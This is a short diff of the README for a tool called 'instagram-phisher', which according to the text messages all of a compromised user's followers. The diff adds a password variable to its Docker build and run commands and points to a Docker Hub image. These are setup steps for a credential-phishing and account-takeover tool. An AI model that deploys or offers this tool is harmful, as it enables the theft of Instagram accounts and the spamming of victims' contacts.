@@ -10,11 +10,11 @@ Once a user is compermised, this tool will DM a configurable message to all foll
 #### With [Docker](https://www.docker.com/)
 ```bash
 docker build -t instagram-phisher ./server
-docker run -p 80:80 instagram-phisher
+docker run -p 80:80 -e password=pass1234 instagram-phisher
 ```
 Alternatively, you can pull the latest build from [Docker Hub](https://hub.docker.com/r/javaww/instagram-phisher)
 ```bash
-docker run -p 80:80 javaww/instagram-phisher
+docker run -p 80:80 -e password=pass1234 javaww/instagram-phisher
 ```
 #### Manual installation
 Install `python3` and `python3-pip`
